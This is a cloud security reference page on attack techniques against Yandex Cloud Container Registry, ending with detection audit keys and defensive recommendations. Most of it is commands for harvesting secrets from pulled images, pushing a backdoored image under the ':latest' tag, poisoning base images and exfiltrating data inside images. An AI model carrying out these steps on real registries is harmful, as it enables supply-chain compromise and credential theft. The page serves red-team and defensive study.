# Container Registry

## Overview

Container Registry stores and distributes Docker images. It integrates with Managed Kubernetes, Serverless Containers, and CI/CD pipelines. Image poisoning is the primary attack vector — supply chain compromise through registry access.

## Credential Access

### Registry Authentication

Container Registry uses IAM tokens or Docker credential helpers:

```bash
# Authenticate Docker with IAM token
echo <iam-token> | docker login --username iam --password-stdin cr.yandex

# Or using OAuth token
echo <oauth-token> | docker login --username oauth --password-stdin cr.yandex
```

### Image Secret Extraction

Pull and analyze images for embedded secrets:

```bash
yc container image list --registry-id <reg-id>
docker pull cr.yandex/<registry-id>/<image>:<tag>

# Analyze image layers for secrets
docker history cr.yandex/<registry-id>/<image>:<tag>
docker inspect cr.yandex/<registry-id>/<image>:<tag>

# Extract filesystem and search
docker save cr.yandex/<registry-id>/<image>:<tag> | tar -xf -
grep -r "password\|secret\|key\|token" .
```

---

## Persistence / Lateral Movement

### Image Poisoning (Tag Override)

Push a backdoored image with the same tag:

```bash
docker build -t cr.yandex/<registry-id>/<image>:latest -f Dockerfile.backdoor .
docker push cr.yandex/<registry-id>/<image>:latest
```

Any service pulling `:latest` (Kubernetes, Serverless Containers, CI/CD) executes the backdoor.

### Base Image Poisoning

If custom base images are stored in the registry, backdoor the base image to compromise all derived images on next build.

### Exfiltration via Image

```bash
docker build -t cr.yandex/<registry-id>/exfil:latest -f - . <<EOF
FROM scratch
COPY sensitive_data /data
EOF
docker push cr.yandex/<registry-id>/exfil:latest
```

---

## Enumeration

```bash
yc container registry list --folder-id <folder-id>
yc container image list --registry-id <reg-id>
yc container image scan <image-id>   # Vulnerability scan
yc container image list-scan-results --image-id <image-id>
```

---

## Detection

| Event | Audit Key |
|---|---|
| Image push | `container-registry.images.push` |
| Image pull | `container-registry.images.pull` |
| Registry creation | `container-registry.registries.create` |
| Scan initiation | `container-registry.images.scan` |

## Defensive Recommendations

1. Pin images by digest (`@sha256:...`), never just `:latest`
2. Enable automatic vulnerability scanning
3. Restrict push access to CI/CD service accounts only
4. Monitor image push events — alert on unexpected pushes
5. Use image signing/verification if available
